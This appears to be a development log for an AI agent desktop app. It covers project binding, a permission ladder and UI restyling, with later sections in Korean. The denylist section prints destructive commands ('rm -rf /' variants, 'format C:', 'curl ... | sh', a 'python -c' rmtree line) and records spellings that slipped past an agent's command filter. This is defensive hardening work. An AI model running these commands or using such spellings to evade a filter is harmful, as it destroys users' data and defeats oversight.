   extensionless specifiers were fixed — and so could the three files under it
   that were also extensionless (`ConfirmDialog.tsx`, `events.ts`). Every other
   file in `app/src` already used `.js`, precisely because only files a test
   loads had ever needed to. Vite resolves `.js` → `.ts`/`.tsx` unchanged, so the
   bundle is unaffected; the packaged app was rebuilt and re-measured to confirm
   (rail 52, `.main` 1114, bar 48).
2. **`mount()` drains the handshake before any test body runs.** `App` makes
   eight calls before it draws, and `node:test` awaits between tests — so the
   late ones land in the gap and update React outside `act`. The warning that
   produces is attributed to whichever test is running *next*, which is worse
   than silence because it teaches you to ignore the line. The suite now runs
   with zero `act` warnings, which is what makes the line worth reading again.

**Three of the first tests were wrong and the app was right** — worth recording
because each would have been "fixed" by weakening the assertion:

- Boot calls do **not** arrive in a fixed order. `tools.get` and `reasoning.list`
  belong to effects that start once the window connects, so they interleave with
  the boot sequence; measured, `tools.get` arrives *before* `conversations.list`.
  The test now asserts `state` is first and the rest is a set.
- A `message.delta` with no matching `turn_id` appends to nothing. The assistant
  message is keyed by the turn id the reducer got from `turn.started`, so the
  test has to send one, exactly as the core does.
- `.logstrip` is not in the DOM while the log bar is closed — deliberately. A
  test asserting on it there would have passed against a window that dropped
  every line of the core's stderr.

## The fifth UI pass — conversations belong to a project

The reference's sidebar has a **Projects** section: a project folder with its
threads nested underneath it. TONYAgent now does the same, and "New chat" asks
which folder a conversation is about when none has been chosen yet.

**The core already had all of this.** `Conversation.project` has been persisted
and returned in every summary since it was added; `conversations.create` has
always taken a `project` argument; `sandbox.start` already registered the folder
with `folder_manager`. The whole change is the window drawing a structure that
the data already carried — which is worth knowing, because "add projects" reads
like a core feature and was not one.

### The bug this found

`conversations.switch` set `self.project` and stopped there. But the file tools
and `search` resolve their paths against **`folder_manager`**, not against the
field `state` echoes back. So opening a conversation from a second project left
the window *claiming* that project while every tool still read the first one —
and the agent went on editing files in a directory nobody was looking at.

Nothing had caught it because the only thing asserted was the reply, and the
reply was correct. This is the same shape as the log-strip bug in the fourth
pass: **a correct answer on the wrong subject.**

`_bind_project` in `server.py` now moves the folder on every path that names a
project — switch, create, and `sandbox.start`. Three decisions inside it:

- **Switching does not start a sandbox.** It records the folder and leaves any
  running container alone. Mounting one is the user's explicit act, and a
  background restart on every conversation click would be a surprising thing
  for a click to do.
- **A conversation with no project clears nothing.** Every chat saved before
  `project` existed has none. Clearing the folder on one of those would take
  away a working workspace on behalf of a conversation that merely predates the
  field.
- **A folder that has moved is a warning, not an error.** The transcript is on
  disk and readable; raising would trade a log line for a window that cannot
  open a chat at all.

### Two bugs the tests caught in the new code

Both were in `App.tsx`, and both are the kind that only composition tests see:

1. **`startNewChat` closed over a stale `project`.** It read `project === ""`,
   awaited `attachProject`, then passed `project` to `createConversation` — and
   the state variable belongs to the render that started, so the value was still
   `""`. Every chat created after a *fresh* folder pick was filed under the
   empty string. `attachProject` now returns the project it settled on, and the
   flow files the chat under that.
2. **The folder picker was untestable, so its branch was untested.** "New chat"
   opens a *native dialog* when no project is set, and jsdom cannot open one —
   so the branch could only have been verified by driving the packaged app and
   watching a dialog appear. `App` now takes an optional `pickProject` prop,
   for the same reason it takes `backend`: the seam is what makes the path
   testable, and the path is where the bugs were.

### What the panel draws

Projects are **derived from the conversations the core reports**, not kept in a
registry. A project is not something the user creates — it is the folder a
conversation was started in — so a registry would be a second source of truth
about a list that changes while you are looking at it, and every way of emptying
a project's only chat would leave a folder behind corresponding to nothing.

- The **active project is pinned first**; the rest keep the core's newest-first
  order rather than being re-sorted by name, which would bury the project used
  yesterday under ones untouched for months.
- Conversations with **no project** group under `"No project"` rather than being
  dropped. Hiding them would make the list quietly lose rows.
- The header **folds**, with `aria-expanded` on the button — a fold that only
  shows in a caret's shape reports a full project as if it were all there.
- **"New chat" names the project** it will file under, or says "Choose folder"
  when there is none. A button that silently files a chat under whatever folder
  was open last is how a conversation ends up somewhere the user did not mean.
- The **"+" opens the picker on the open project only**, because it picks the
  project for the *next* chat rather than moving the current one.

`groupByProject` and `projectName` are module-level in `ConversationList.tsx`
and covered directly; the folding, the label, and the picker are covered
through the panel, and the whole "New chat" flow through `App.test.tsx`.

### Verified

- **Python 592 passed, 7 skipped.** Three new tests in `test_headless_core.py`,
  and the key one was **checked to fail without the fix** (it reported `alpha`
  where `beta` was expected) — the first time in this project a regression test
  was proven to have teeth before being believed.
- **TypeScript 361 passed** (was 341), zero `act` warnings.
- `audit_reduced_motion.py` clean: the new rules carry no animations, only the
  `transition` on `.chatproj-add`, matching `.chatrow-more`.

## The sixth pass — a permission bar, Low / Medium / High / Full

Asked for as "a permission bar above the chat window". Built on the axis the
core already had rather than as a new concept: `modes.py` already carries
per-mode `allowed_tools`, and the module's own docstring states the rule this
whole feature turns on —

> **Plan refuses writes, it does not merely discourage them.** A mode that only
> changes the prompt produces a model that says "I will not modify the file"
> right before it does. Prompt text is a request; the allow-list is a fact.

So a permission level is an **allow-list**, enforced in the orchestrator, and
the bar reads what the core says rather than naming four things itself.

### What is actually new

Only **Medium**. Low is exactly `Plan`/`Skills`, High is exactly
`Build`/`Mission`, and both were already selectable — so the bar would have
been two already-known settings wearing new names.

Medium is the rung that did not exist: *edit files, refuse to execute code*.
Before this there was no way to say it. The honest settings were Build (which
shells out) or Plan (which cannot write at all), so a user who wanted the agent
to fix source but not run it had to pick one and give up the other half.

**Default is Medium, deliberately.** A window that can run shell commands the
moment it opens has already been given more than the user asked for, and Medium
vs High is exactly one tool — the one that executes model-authored code.

### Full: what it really is

The user asked for Full and accepted responsibility for it, which is the right
call. But it is worth being exact about what the level does, because the
difference matters:

- **Full adds no tool.** `PERMISSIONS["full"].allowed_tools == PERMISSIONS["high"]
  .allowed_tools` is asserted directly, so a later edit cannot quietly hand Full
  something nobody reviewed.
- **Full removes one thing: the question.** It does not lift the command
  allow-list, and it does not lift the sandbox requirement. `execute_command`
  still refuses without an isolating backend behind it.

There is a test for that boundary specifically — `test_full_still_refuses_a_
command_off_the_allowlist` — because it is the line the level must not cross.
**It was verified to fail** when the allow-list check was reverted to
`skip_confirm = True`. Full becoming a way past the allow-list is exactly the
kind of change that would be invisible in review and permanent in practice.

Full is also *broader* than the existing per-project trust flag, on purpose.
Trust is a setting in Settings that tends to stay set; Full is visible in the
bar and read every turn, which makes it the answer for "I trust this one job".
Neither one alone is required — the check is `full or trusted`.

### The line the bar draws about `python -c`

Stated in the UI, because it is the truth about this control: the allow-list
matches on the **executable's name** and cannot see what it is handed. So at
Full on a trusted project, `python -c "<anything>"` runs. Full does not create
that — it makes it visible instead of leaving it buried in a trust toggle.

### Two axes, intersecting

`Mode` decides what the agent is *for*; the permission level decides how far it
may go. `ToolOrchestrator.tool_permitted` returns the **intersection**, so
either can only ever narrow what the other allows. Asking for Full while in
Plan mode does not put `write_file` back.

`_new_session` now carries the level across a conversation switch. A replacement
session starts at the default, so without that, switching chats would hand the
agent back permissions the user had just taken away — while the bar went on
showing their choice. The bar and the gate must not disagree.

### What the tests caught

1. **`test_writing_modes_keep_every_mutating_tool` started failing.** Not a bad
   test — a real collision. It asserts that Build/Mission withhold no mutating
   tool, which is still true; it just could not see that the *schema* is now the
   intersection of two axes, and the default level withholds
   `execute_command` on purpose. Fixed by raising the permission first, which is
   what isolates the question it was asking.
2. **`.permmenu` was missing from the reduced-motion block**, and
   `scripts/audit_reduced_motion.py` caught it on its first run. That script has
   now earned its keep twice: it once found `.tab-spinner` and now found a
   selector added after it was written.

### Verified

- **Python 602 passed, 7 skipped.** Seven new tests, including the Full/allowlist
  boundary proven to fail without its fix.
- **TypeScript 381 passed** (was 361), zero `act` warnings.
- `audit_reduced_motion.py` clean.
- `ComposerAttach` flakes roughly one run in three on Windows, hitting a
  different test each time. **Pre-existing**, reproduced on unmodified code
  earlier in the project, and unrelated — it is an attachment-preview test
  and nothing here touches attachments.

## A follow-up to the permission bar: two real bugs

Both found by using the app rather than by reading it, and both the same shape
as the ones above: **the window said one thing and the core enforced another.**

### 1. A chosen folder was never remembered (two bugs, not one)

The report was "I already picked a folder and it says it cannot see it". The
sidebar *did* show `WebAIAgent`, so the label was right and the tools were
wrong.

There were **two independent halves, and fixing only one changes nothing**:

- **Write.** `FolderManager.set_folder` assigned to `settings.folder.current`
  and stopped. Nothing writes config.toml on attribute assignment, so the
  choice never left the process.
- **Read.** Even once written, nothing read it back. `FolderManager.__init__`
  read `settings.folder.current`, which is only ever populated *in the process
  that made the assignment* -- the sidecar never loads config.toml into the
  settings model. It reads the file directly for the saved provider, in
  `headless/server.py`, for exactly this reason.

**So the restore had never once worked**, however often a folder was picked.
Fixing only the write would have looked fixed in the session and still been
broken on the next launch, which is the more annoying shape of the bug.

Why the label was still right: a conversation records its own `project` on
disk, so the sidebar drew the project after a restart while every tool
answered "No project folder selected". One more disagreement between a field
and the folder the tools actually resolve against.

`save_folder` in `config/migration.py` follows the existing read-modify-write
pattern, for the documented reason (the sidecar never loads `settings`, so
assembling a dict from it would write defaults over the user's real config).

Both tests are asserted **by reloading the file and building a fresh
`FolderManager`**, never by reading the live model -- the model held the right
value throughout, so an assertion on it would have passed while the bug was
live. The write test was checked to fail with the saver disabled
("nothing was written to the config file").

### 2. Stop was a wide text pill where Send is a 28px icon

`.btn` with the word "Stop" in it, in the send button's slot, so it was much
wider than the icon it replaced: **the control row reflowed every time a turn
started**, dragging the model chip and the `+` sideways mid-turn.

Now `.icon-btn.stop-btn`, so it takes its 28x28 from the same rule Send does.

**It deliberately does not reuse `.send-btn`.** That was the first attempt, and
it was wrong twice over: that class carries Send's accent fill, and reusing it
made "is there a send button on screen?" answer *yes while Stop was up* -- which
is the exact question the existing busy-state test asks, and which the whole
"replaced, not disabled" behaviour rests on. The test caught it as a
`RangeError` from node trying to diff a DOM element.

### Verified

- **Python 581 passed** (excluding `test_build_scripts.py`), **TypeScript 383
  passed**, Composer 27/27 with no `RangeError`.
- `test_build_scripts.py` fails 2-4 tests per run, **hitting different ones
  each time**. Reproduced on unmodified code with everything stashed, so it is
  pre-existing and environment-dependent (it runs the real launcher). Worth
  knowing before spending time on it.
- `ComposerAttach` still flakes ~1 run in 3 on Windows, as before.

## The fifth pass: Full runs what is not on the allow-list

### The decision

`Full` previously widened nothing. It was High's tool set with the
confirmation prompt removed -- `bypasses_command_allowlist` did not exist, and a
test asserted that Full and High had identical allow-lists so nobody could
quietly widen it later. The user then chose to widen it: at Full, commands
outside `settings.tools.command_allowlist` run too. The denylist is unchanged,
because "commands nobody thought of in advance" and "commands that destroy the
machine" are separate decisions and only the first one was widened.

### Where the flag lives

`Permission.bypasses_command_allowlist` in `src/tonyagent/core/modes.py`, read by
`ToolOrchestrator.allows_any_command()`. `_is_command_allowed` checks the
denylist first and unconditionally, then returns early on the bypass. The check
order is the thing not to get wrong: a bare flag placed before the denylist would
widen both, and only the denylist test would notice.

### One authority, not two

The first attempt had `ExecuteCommandTool` read `tool_orchestrator` (the
module-level singleton) while `ToolOrchestrator` consulted its own
`self._permission`. A test that constructs its own orchestrator then got two
different answers: the confirmation logic saw Full and skipped asking, while the
tool saw the singleton's default and refused the command anyway.

It is now one process-wide flag, `shell_tools._ALLOWLIST_BYPASS`, written only
by `ToolOrchestrator.set_permission` through `set_allowlist_bypass()` and read by
`allowlist_bypassed()`. Process-wide because the permission level is process-wide
session state; a module flag is the honest shape, and an autouse fixture in
`test_modes_and_diffs.py` resets it so a Full test cannot hand its authority to
the next one.

### On the wire

`_permission_payload` now sends `runs_any_command`. High and Full are identical on
`runs_commands`, which is exactly the pair the user chooses between, so a flag
that only reports tool reachability cannot tell them apart. The bar marks the
rung from the boolean rather than from the description -- prose is not something
to parse for a security fact.

### What the bar shows

Full's row carries two markers, `any command` and `no prompts`, because those are
two decisions: being willing to have the agent run `ls` is not the same decision
as being willing to have it run anything unasked. `gain()` reports only the first
difference to the rung above, so the sentence stays one clause wide and the rungs
stay comparable.

### Tests

- `test_full_runs_a_command_off_the_allowlist` -- end to end through
  `execute_tool_async`, so both gates are proven open. Verified to fail when
  `bypasses_command_allowlist` is flipped to False.
- `test_high_still_refuses_a_command_off_the_allowlist` -- the negative, so the
  ladder still means something.
- `test_full_still_refuses_a_denylisted_command` -- the line Full does not cross,
  pinned against `rm -rf /`, `format C:`, `shutdown /s`.
- `test_the_ladder_reports_which_rung_widens_the_allowlist` -- the wire.
- `PermissionBar.test.tsx` -- both markers, and High's gain is now the
  allow-list sentence. **Deleted in the seventh pass**, when the bar it
  tested became the first group of the settings panel;
  `SettingsMenus.test.tsx` covers the same menu.

### Counts

Python 605 passed / 7 skipped. TypeScript 383 tests, 382 pass with the
`ComposerAttach` Windows flake. `test_build_scripts.py` fails 3-5 per run on
unmodified code too -- it runs the real build script and depends on build
freshness.

## The sixth pass: the denylist, which Full made load-bearing

### What the user asked for

Keep `rm -rf /`, `format C:` and `shutdown` impossible at Full. They were
already refused, and deliberately so -- but that turned out to be the least
interesting thing about the request.

### What probing it found

At Full the allow-list no longer applies, so the denylist is the only thing
between the agent and the machine. It was eight regexes matched with `re.search`
against the raw command string. A probe of 25 spellings of the three forbidden
operations found **11 that ran**, including:

    rm -rf /        BLOCKED
    rm -rf "/"      ran          -- one quote character from the blocked form
    rm -r -f /      ran
    rm --recursive --force /  ran
    curl http://x.sh | sh    ran

The last one is its own finding. The pattern was `curl\s+\|\s*sh`, which
requires the pipe to touch `curl` -- and a real command has a URL in between, so
**it could not match the thing it names**. It had been sitting in the list
looking like protection. It did no harm while the allow-list blocked `curl`
anyway; removing the allow-list is what made it load-bearing and wrong.

### The fix

`normalize_for_denylist` in `shell_tools.py` removes quotes, collapses
whitespace, and strips `cmd /c` / `powershell -Command` wrappers (repeatedly,
because the nesting is two deep in practice). The patterns were rewritten to
describe the *operation* rather than one spelling: `rm` with a recursive flag in
any form, `del/rd/rmdir /s`, `format` with or without a drive letter,
`Stop-Computer`/`Restart-Computer`, `Remove-Item -Recurse`, and a pipe-to-shell
pattern that can actually match one.

Result: **0 of 25 get through**, and ordinary work still runs.

### Two bugs the probe caught in my own change

1. `powershell|pwsh\s+-command` binds the flag requirement to `pwsh` only, so
   the first branch matched bare `powershell` and deleted the first word of
   every PowerShell command before the denylist saw it.
2. `-enc` was in the wrapper list. Unwrapping an encoded command leaves an
   opaque base64 blob that no pattern can read, and it silently defeats the
   pattern that exists to block it. An obfuscating flag is refused on sight,
   never looked inside. Both now have a comment saying so.

### The test has teeth, and an honest limit

`_DENYLIST_DISGUISES` in `test_modes_and_diffs.py` is 33 spellings. Reverting the
patterns to the original eight fails it. But `test_quoting_and_wrapping_do_not_
change_what_a_command_is` documents the other half honestly: **normalisation is
not what makes those 33 pass** -- the patterns are broad enough on their own,
verified by disabling normalisation and watching the disguise test stay green. It
earns its place for patterns *other people* write into `command_denylist`, which
is a setting and would otherwise stop matching the day a path got quoted.

`test_the_denylist_does_not_block_ordinary_work` is the other half of a
boundary. `rm -f build.log` must still run: a denylist that blocked it would
push the work into `python -c "shutil.rmtree(...)"`, which every level permits.

### The gap this design cannot close

`python -c "import shutil; shutil.rmtree('C:/')"` runs at Full, and no denylist
over command strings will ever stop it. `python` is on the allow-list, so it ran
before Full existed too -- but that is the point: **the denylist is a cheap
inner ring, not the wall.** The wall is `ExecuteCommandTool`'s isolation gate
(`isolation_required = True`, `fallback_to_local: False`), which means the
command runs inside a container the agent cannot see out of. With Docker
stopped, Full refuses everything rather than running it on the host, which is the
designed behaviour.

So: the honest description of Full is "any command, inside the sandbox, except
the handful of machine-destroyers above". Do not describe it as safe on its own.

## The seventh pass: the settings menu, and the sidebar that says "over"

Three changes, all in the same direction: put a control where a user goes to
look for it, and stop letting a platform widget be the one thing in the window
that does not match the reference.

### 1. The conversation panel got a scrim

The panel was already an overlay -- `position: absolute`, anchored to the rail,
sliding in from the left -- and it already had a shadow. What it did not have
was the thing that makes an overlay legible: the Files panel has had one since
it became an overlay, and it is a blur plus a *light* tint, because on a
near-black UI a dark scrim changes nothing and the panel read as a layout break
rather than as something opened over the window.

`.chatlist-scrim` is now the same rule, with one deliberate difference:
`inset: var(--topbar-h) 0 0 var(--rail-w)` rather than the Files panel's
full-width inset. **The scrim stops at the rail on purpose.** Covering the rail
would put Stop and Settings -- the two buttons reached for mid-turn -- behind a
backdrop that has to be dismissed first, and the panel is anchored to the rail
precisely so the rail stays operable. `layout.test.ts` asserts the difference
against `.sidebar-scrim` so the two cannot converge by accident.

It is a `<button tabIndex={-1}>` for the same reason `.sidebar-scrim` is: a
full-window backdrop in the tab order is something a keyboard user tabs past to
reach the rail. Escape and the rail toggle both already close the panel.

### 2. Thinking was a native `<select>`, and is now a menu

This was the reported bug, and the cause was structural rather than cosmetic.
The Thinking control was a real `<select>`, so on Windows it rendered the
platform's own list: a light box, a system font, a system arrow, on a black
panel. It was the one control in the window that did not come from this
stylesheet, and no amount of styling around it changes that.

Permission already had a proper menu. Rather than write a second menu and let
the two look alike by accident, **both now come from one component** --
`SettingsMenus.tsx`, with a `ChoiceMenu` that draws the trigger, the list and the
rows. `PermissionMenu` and `ThinkingMenu` differ only in the rows they pass.

Class names moved with it, from `.permbar*`/`.permmenu*` to `.permchoice*`,
because the vocabulary is no longer one control's: `.permchoice-warn` sits
beside a thinking effort as readily as beside a permission level. The composer's
720px measure is gone with the control -- it meant "line up with the field",
which is meaningless in a 500px modal -- and the menu is now `left: 0; right: 0`
so it is exactly as wide as the row that opened it.

### 3. Both moved into the settings panel

Permission and Thinking answer the same question -- *how much may this window do
without asking* -- and they were in the two worst possible places: a strip above
the composer you scroll past, and a native dropdown in the field's own row. They
are now the first two groups in Settings.

**Nothing is duplicated.** The composer lost both, and `App.test.tsx` asserts
that nothing about either control exists before the panel is opened.

### The gear was a sun

Separately: the rail's settings icon was two concentric circles with eight
radial ticks, which is what you get by writing a gear as "a body and some
teeth" rather than as a shape. It reads as a sun or a brightness icon, and at
17px the ticks are far enough apart that the eye never joins them to the body. It
is now one continuous outline -- hub and toothed body in the same silhouette --
which is the only thing that survives being drawn at that size.

`IconRail.test.tsx` asserts on the shape rather than the pixels, because the
shape is the checkable part: no `<circle>` (that is what a sun is), all marks
are `<path>`, and there is more than one of them.

### One real bug the mutation check found

A throwaway script sabotaged each behaviour in turn and required the suite to
notice -- 22 cases, all caught -- then was deleted rather than kept. It found
that **`ThinkingMenu`'s no-dial guard lived in its caller**, not in the
component: rendered on its own, it produced a menu with exactly one entry --
"Default" -- for a model that reports no dial. A control offering only the
choice that does nothing. The check now lives in the component, and the panel
checks it a second time because a heading over nothing is worse than no heading.

The script itself needed two things worth remembering if the technique is ever
reused: it must recompile before each run (the tests execute out of `.tmp/`, so
a source sabotage is invisible until `tsc` has re-run), and it must match each
file's own line endings (several files here are CRLF and an `\n` anchor matches
nothing in them -- which reads as "untested" rather than as "not found").

### Counts

**TypeScript 411 passed** (up from 382: +22 for the settings menus, +8 for the
rail, and the Thinking dial's 15 moved out of `Composer.test.tsx` rather than
being copied). **Python 609 passed, 7 skipped**, unchanged -- this pass touched
no core code. `audit_reduced_motion.py` clean, with both new selectors
(`.chatlist-scrim`, `.permchoice-menu`) in the reduced-motion block.

`ComposerAttach.test.tsx` still flakes about one run in three on Windows, a
different test each time; `tests/unit/test_build_scripts.py` still fails 3-5 per
run on unmodified code. Neither is related to this pass.
### What driving the real app found

The first build of all this looked finished in jsdom and was broken in the
window, and both defects were of the same kind: **a rule that was correct for
where the control used to live.**

1. **The settings panel did not fit.** `.modal` is one class shared by all three
   dialogs -- confirmation, settings, search -- and it had no height bound at
   all. Measured live in an 800px window: 866px tall, starting at y=-33, so the
   Model group and the Close button were rendered off the bottom of the screen
   with nothing to scroll them into view. `max-height: 100%` (against the
   backdrop's content box, which is already inset by its 24px padding) plus
   `overflow-y: auto` fixes it without touching the search panel, which caps
   itself lower and scrolls its own result list.

2. **Both menus opened above the top of the screen.** `.permchoice-menu` was
   `bottom: calc(100% + 6px)` -- correct while this was a bar pinned to the
   bottom of the composer, and exactly wrong once the rows became the panel's
   *first* group. Measured live: the permission menu at y=-210 (294px tall), the
   thinking menu at y=-14. Being inside a scrolling modal, they were clipped by
   the panel as well, so this was not merely off-screen but unreachable.

   The fix is to stop declaring the direction. `measureMenu()` takes the
   trigger's rectangle and the panel's and returns the side with more room plus
   that room as a `max-height`, written inline; the stylesheet declares both
   anchors on `[data-dir]` and the base rule declares neither, so a menu that
   never got a direction renders unpositioned rather than silently opening the
   wrong way. `overflow-y: auto` on the menu is the backstop for a list taller
   than the cap. A tie opens **down**, which is the case the panel is actually
   in now.

Both are asserted in `layout.test.ts` against the live measurements, because
the assertions that would have caught them ("the menu opens upward") were the
ones that were wrong.

### What is still true, and one thing that is not

Verified live, over CDP, against the packaged build: the gear opens the panel;
both menus render inside it and name the values the core reported; picking
`Low` and `xhigh` round-tripped through `permission.set` and `reasoning.set`
and came back on reopening the panel; Escape closes the menu without closing the
panel behind it; an outside pointerdown and a re-click of the trigger each
dismiss; the scrim dims and swallows clicks over the composer while leaving the
rail live.

**One asymmetry worth knowing before anyone reports it as a bug:**
`reasoning.set` writes the effort to config (`save_reasoning_effort`) and
survives a restart; `permission.set` is session-only, so a respawned sidecar
comes back at `medium`. That is pre-existing and defensible -- a permission
level that silently stayed at Full across a restart would be the worse
behaviour -- but it means the two controls sitting side by side in the same
panel do not persist the same way. Nothing in the UI says so.


---

## Pass: the visual design sweep (6 sections)


레퍼런스 캡처에서 값을 빌려오던 상태를 끝냈습니다. 아래 수치는 **전부 이번에
현재 트리에서 다시 읽은 값**이고, 각 값이 왜 그런지는 `app/src/styles.css`
헤더와 각 토큰 옆 주석이 원본입니다. 문서가 숫자를 다시 적는 순간 두 번째
소유자가 생기므로, 여기서는 값과 **어떤 종류의 근거인지**만 적습니다.

### 값과 근거

| 값 | 현재 | 근거 |
|---|---|---|
| `--bg` ~ `--border-strong` 12단계 | 무채색 램프 | **이 앱의 선택.** 예전 값은 Freebuff 캡처의 warm green-grey였고, chroma가 3~4만 있어도 두 창이 같은 창으로 읽혔습니다 |
| `--fg-mute` | `#8a8a8a` — `--bg` 위 **5.04:1** | **대비 계산.** 옛 값 `#7c807a`는 4.21:1 — 이 토큰은 11px 이하에 쓰이는데 4.5:1 미달이었습니다 |
| `--accent` | `#6393f0` — `--bg` 위 **5.77:1** | **아트워크에서 읽음.** `icons/*.png`의 불투명 픽셀 87%가 `#2f6feb` 본체이고, 그 안티에일리어스 램프에서 4.5:1을 넘는 가장 어두운 스텝 |
| `--accent-bright` | `#97b7f5` — `--chip` 위 **5.38:1** | 같은 램프 한 스텝 위. 칩 위의 작은 글씨용 |
| `--accent-fg` | `#0b1020` — `--accent` 위 **6.28:1** | 같은 PNG에 이미 있던 잉크 |
| `--focus-ring` | `var(--accent-bright)` | 전용 이름. 링과 배지가 우연히 한 스텝을 공유하지만 요구조건이 다르므로 같이 움직이지 않습니다 |
| 위계 | 7단, 10 → 20px | **이 앱의 선택.** 리터럴 14개를 토큰으로. `--text-2xs` 10px는 모양·배지용이고 본문 인접 최소는 `--text-xs` 11px |
| 라디우스 | 5단, **6 / 12 / 16 / 24 / 999** (리스타일에서 한 칸씩) | **이 앱의 선택.** `calc(var(--radius-sm) - Npx)` 리터럴 10개를 규칙 이름으로 |
| 모션 | `--motion-fast` 110ms, `--motion-base` 160ms | **이 앱의 선택.** 상태 전환(110)과 surface 도착(160)의 두 축. 미사용이던 `--motion-slow`은 삭제 |
| 그림자 | `--shadow-1` / `--shadow-2` | **이 앱의 선택.** 1px inset 하이라인이 레퍼런스에는 없는 추가이고, `--shadow-2`는 창 모서리에 붙은 패널이므로 그림자 방향을 `--panel-cast`에서 받습니다 |
| `--rail-w` / `.rail-btn` | 56px / 40×40 | 40px은 최소 클릭 타깃, 56은 양옆 8px를 남기기 위한 값 — **레일 폭을 버튼이 정합니다** |
| `--topbar-h` | 44px | **내용 기준**: 13px 텍스트 한 줄 + 그 높이를 채우는 캡션 버튼 |
| `--list-w` | 260px | 레퍼런스 255 + 5. 제목이 한 글자 덜 잘리는 문제. 레퍼런스가 아니라 이 앱의 판단 |
| `--measure` | 680px | **이 앱의 선택.** 트랜스크립트·컴포저·힌트·배너가 공유. 예전엔 860px 트랜스크립트 위에 720px 컴포저 |

`--ok` `#a3c48a`는 값을 바꾸지 않았습니다. 액센트가 파랑으로 바뀌자 색상환
**125°** 떨어졌고(옛 63°), "성공"과 "이 앱의 색"이 더는 같은 이름이 아닙니다.

### 마크

`icon.svg`의 캐럿-위에-기준선 하나에서 17개 래스터가 나오고, 앱 안 **두 곳**
(레일, 첫 화면)도 **같은 경로 데이터**를 씁니다 — 둘 다 `AppMark.tsx`를
통해서요. 그 컴포넌트와 `icon.svg`를 `AppMark.test.tsx`가 바이트 단위로
대조하므로 세 벌이 갈라질 수 없습니다.
`viewBox 0 0 512 512`, 스트로크 72(16px에서 2.25px로 남는 값), 라운드 조인.
miter였으면 16px에서 두 개의 끊어진 점선으로 보였습니다.

### 포커스 링

`:focus-visible` 규칙 **하나**만 있고, `outline: none`은 파일 전체에 0개입니다
(예전엔 5개). 링 색은 `--focus-ring` 토큰이고 오프셋 2px가 함께 들어갑니다 —
오프셋이 없으면 링이 컨트롤 자신의 채움 위에 그려져 `--accent` 대비 1.49:1이
됩니다. 대조는 토큰 계산, 스톱 수는 패키징드 빌드를 CDP로 실제 탭해서
2026-10-04에 다시 잰 값입니다:

```
--accent-bright 대조(계산)   --bg 8.63:1   --chrome 7.50:1
                            --raised 6.26:1   --chip 5.38:1
기본 화면 탭 스톱(실측)      서로 다른 스톱 8개, 전부 outline 2px solid
                            rgb(151,183,245), offset 2px, :focus-visible true
링 뒤 실제 배경 대비 최소값  7.02:1,   링 없는 스톱 0
포인터 클릭 시              :focus-visible 일치 0개 — 링은 키보드 전용
```

이전 패스에서 대화 패널과 설정 대화까지 열어 잰 45스톱 walks도 전부
링이 있었습니다. 45라는 수는 그때의 것이고, **기본 화면만 보면 8**입니다 —
첫 화면 패널이 포커스 가능한 것을 하나도 추가하지 않는다는 사실과 같은
결과입니다.

### 첫 화면 (빈 대화)

`MessageList.tsx`의 `.empty`: 마크 · 워드마크 · 한 줄 안내 · `/` `@` 힌트.
**클릭·포커스·제출 가능한 것이 하나도 없습니다** — 버튼도 링크도 `tabindex`도
없고, `MessageList.test.tsx`가 `.empty` 안의 포커스 가능 요소를 **0개로**
세어 잡습니다 — 재귀자가 붙어도 통과하도록 패널 자신까지 셉니다.
`AppMark.test.tsx`는 마크 한 개가 어느 자리에서도 포커스될 수 없음을 따로
잡습니다. 두 테스트는 다 음성 단언이라, 무언가를 추가하면 바로 깨집니다.
힌트는 컴포저의 placeholder에 있던 `/`와 `@`를 그대로 위로 올린 것이고,
회전색을 `--accent`으로 그립니다 — `--bg` 위 5.77:1, 그래픽 기준 3:1을 넘습니다.

### 테스트

```
npx tsc --noEmit                 클린
npm test                         451 tests / 73 suites
                                연속 4회 444/444 (ComposerAttach flake 수정됨)
                                451 = 분할 4개 + 리스타일 3개 + 레일 1개
python -m pytest tests/unit -q   610 passed, 7 skipped, 0 failed
scripts/audit_reduced_motion.py  모든 애니메이션 선택자가 취소 목록에 있음
```

`npm test`의 444는 이번에 정리된 수입니다. 이전 문서의 415/426/441은
`.tmp/`에 남아 있던 assert 없는 디버그 테스트 2개(`dbg.test.js`,
`dbg2.test.js`)를 세고 있었고, `build:proto`가 이제 `.tmp`를 지우므로 다시
생기지 않습니다. 440 → 444는 스타일시트 분할 테스트 4개입니다.

`pytest tests -q`(Docker 데몬 필요)는 이번에 돌리지 않았습니다 — 이전 문서의
590/501 수치는 재현하지 않았으므로 그대로 옮기지 않습니다.

---

## Pass: the restyle (gradient, stadiums, air)

디자인 스윕은 **정확성·구조 작업이었고 리스타일이 아니었습니다.** 눈에 보이는 변화가
셋(마크, 레일 버튼 40px, measure 680)뿐이었고 나머지는 대비·스케일·포커스처럼 "틀렸을
때만 보이는" 것들이었습니다. 이번 패스는 반대로 **보이는 것만** 건드립니다.

### 무엇을 빌렸고 무엇을 빌리지 않았는지

가져온 것은 **문법**이고, 색은 가져오지 않았습니다. 스윕의 출발점이 "Freebuff를
따라가지 말고 우리 디자인을 만들자"였으므로, Gemini 팔레트를 그대로 쓰면 빌려온
디자인이 하나에서 다른 것으로 바뀔 뿐입니다. 그라디언트의 시작점은 `--accent`,
즉 **우리 아이콘에서 읽은 파란색**입니다.

가져온 문법 네 가지: 그라디언트가 액센트다 / 컨트롤은 스타디움이다 / 1px 헤어라인보다
톤 차이 / 활성 상태는 채워진 알약이다.

### 값과 근거

| 값 | 현재 | 근거 |
|---|---|---|
| `--grad-accent` | `linear-gradient(135deg, #6393f0, #9b7cf0)` | **아트워크에서 파생.** 첫 스톱은 `--accent` 그 자체이고, 둘째 스톱은 그 색상환을 36° 돌린 것(220°→256°). 색 대비 `--bg` 위 **5.77:1 / 5.41:1** |
| `--grad-wash` | 같은 두 색, alpha 0.18 / 0.12 | **이 앱의 선택.** 선택된 *표면*(대화 행, 탭)용. 텍스트가 그 위에 앉으므로 alpha에 상한이 있습니다 |
| 라디우스 | 5단, **6 / 12 / 16 / 24 / 999** | **이 앱의 선택.** 이전 4/8/12/18에서 한 칸씩. 래더가 없었으면 25개 규칙을 고쳐야 했던 변경입니다 |
| 스타디움 | 칩·탭·검색 필드·레일 활성·전송 | `--radius-pill`. 컨트롤은 스타디움, 컨테이너는 라운드 사각형 |
| 선택 상태 | 행·탭은 wash, 모드 알약만 `--chip` | **이 앱의 선택.** `--chip`은 컨테이너 색이라 "선택됨"과 "호버"가 한 단계 차이였습니다 |
| 레일 활성 | 40×40 타깃 안 40×32 그라디언트 인디케이터 | Material의 nav-rail 인디케이터. 클릭 타깃은 40×40 그대로 |
